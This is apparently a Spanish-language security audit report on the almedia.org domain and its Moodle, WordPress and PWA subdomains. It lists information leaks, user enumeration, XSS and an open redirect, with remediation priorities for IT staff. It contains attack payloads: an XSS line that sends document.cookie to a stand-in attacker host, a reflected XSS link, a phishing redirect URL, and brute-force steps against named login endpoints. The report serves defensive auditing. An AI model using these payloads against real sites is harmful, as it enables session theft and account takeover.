# INFORME INTEGRAL DE VULNERABILIDADES: ECOSISTEMA ALMEDIA.ORG
**Fecha:** 09/02/2026
**Alcance:** `*.almedia.org` (Principal, Correo, Moodle, PWA)
**Estado:** CRÍTICO EN PUNTOS ESPECÍFICOS

Este documento consolida todos los hallazgos de seguridad, vectores de ataque y metodologías de explotación para el dominio `almedia.org` y sus subdominios.

---

## 1. SUBDOMINIO: `moodle.almedia.org` (Plataforma Educativa)
**Tecnología:** Moodle 4.1.20 (PHP)

### A. Fuga de Información de Infraestructura (Information Disclosure)
*   **Vector:** Archivos de instalación públicos.
*   **URLs Vulnerables:**
    *   `https://moodle.almedia.org/lib/upgrade.txt`
    *   `https://moodle.almedia.org/admin/environment.xml`
    *   `https://moodle.almedia.org/enrol/ldap/upgrade.txt`
*   **Explotación:**
    1.  Atacante accede a `upgrade.txt` -> Confirma versión **4.1.20**.
    2.  Atacante accede a `enrol/ldap/upgrade.txt` -> Confirma uso de **LDAP**.
    3.  **Ataque:** Búsqueda dirigida de CVEs para "Moodle 4.1.20" y ataques de fuerza bruta específicos contra usuarios de directorio activo (LDAP), sabiendo que es el método de autenticación.

### B. Superficie de Ataque en API
*   **Vector:** Web Services habilitados públicamente.
*   **URLs Vulnerables:**
    *   `https://moodle.almedia.org/login/token.php`
*   **Explotación:**
    1.  **Token Brute-Force:** Script automatizado que prueba combinaciones de usuario/pass contra este endpoint. Es más rápido que atacar el formulario web porque no carga imágenes ni HTML.
    2.  **Resultado:** Obtención de un `wstoken` (token de servicio) que permite controlar la cuenta del usuario vía API REST.

---

## 2. SUBDOMINIO: `correo.almedia.org` (Web Corporativa / Blog)
**Tecnología:** WordPress

### A. Enumeración de Usuarios (User Enumeration)
*   **Vector:** REST API de WordPress mal configurada.
*   **URL Vulnerable:** `https://correo.almedia.org/wp-json/wp/v2/users`
*   **Explotación:**
    1.  Petición GET a la URL.
    2.  Respuesta JSON revela: `id: 1`, `slug: admin_almedia`, `name: Administrador`.
    3.  **Ataque:** El atacante ya tiene el 50% de las credenciales (el usuario). Ahora solo necesita fuerza bruta para la contraseña contra `/wp-login.php`, aumentando exponencialmente sus probabilidades de éxito.

### B. Cross-Site Scripting (XSS) Reflejado
*   **Vector:** Librería jQuery 1.11.2 obsoleta.
*   **Ubicación:** Código fuente del frontend.
*   **Explotación:**
    1.  Se crea un enlace malicioso: `https://correo.almedia.org/#<img src=x onerror=alert(document.cookie)>`
    2.  Se envía por email a un empleado.
    3.  Al abrirlo, la librería jQuery antigua procesa el hash (`#...`) inseguramente y ejecuta el código JavaScript, robando la sesión del empleado.

---

## 3. SUBDOMINIO: `pwa.almedia.org` (Aplicación Web Progresiva)
**Tecnología:** JavaScript SPA (Single Page Application)

### A. DOM-Based XSS (Alto Riesgo)
*   **Vector:** Inyección de HTML sin sanitizar en funciones JavaScript personalizadas.
*   **Archivos Afectados (Detectados por Scanner):**
    *   `alumnos.js`: `$("#incidenciaTXT").html("<p>"+inciTXT+"</p>...")`
    *   `inicio.js`: `$('#event-description').html(des...)`
*   **Análisis:** El código toma una variable (`inciTXT`, `des`) y la inyecta directamente en el HTML usando `.html()`.
*   **Explotación:**
    1.  Si `inciTXT` proviene de un input del usuario (ej. "Descripción de la incidencia"), un alumno puede escribir: `<img src=x onerror=fetch('http://atacante.com/'+document.cookie)>`.
    2.  Cuando el administrador o profesor vea esa incidencia en su panel, el navegador ejecutará el código malicioso.
    3.  **Impacto:** Robo de sesión del profesor/admin que revisa las incidencias.

### B. Open Redirect
*   **Vector:** Manipulación de `window.location`.
*   **Archivo:** `main.js` -> `window.location.href = url;`
*   **Explotación:**
    1.  Si la variable `url` se toma de un parámetro GET (ej. `?redirect=...`), un atacante puede crear: `https://pwa.almedia.org/?redirect=https://sitio-phishing-falso.com`.
    2.  El usuario confía en el dominio `almedia.org`, hace clic, y es redirigido silenciosamente a una web falsa para robarle credenciales.

---

## 4. DOMINIO PRINCIPAL: `almedia.org`

### A. Fuga de Datos en Documentos (Metadata)
*   **Hallazgo:** `https://www.almedia.org/images/LOPD/ALM_02.1.pdf`
*   **Riesgo:** Los documentos PDF suelen contener metadatos (autor, software usado, rutas de disco, emails internos) que sirven para ingeniería social.

---

## RESUMEN DE PRIORIDADES PARA EL EQUIPO DE TI

1.  **URGENTE (PWA):** Revisar `alumnos.js` y `inicio.js`. Cambiar `.html()` por `.text()` o usar librerías de sanitización (DOMPurify) antes de mostrar datos de incidencias.
2.  **URGENTE (Moodle):** Bloquear acceso web a archivos `.txt` y `.xml`. Borrar carpetas de plugins no usados (`/enrol/paypal`).
3.  **ALTA (Correo):** Instalar plugin de seguridad (ej. WP-Hardening) para desactivar la enumeración de usuarios en la REST API (`/wp-json/wp/v2/users`).
4.  **MEDIA:** Actualizar jQuery en el sitio principal o usar `jQuery-migrate` seguro.

---
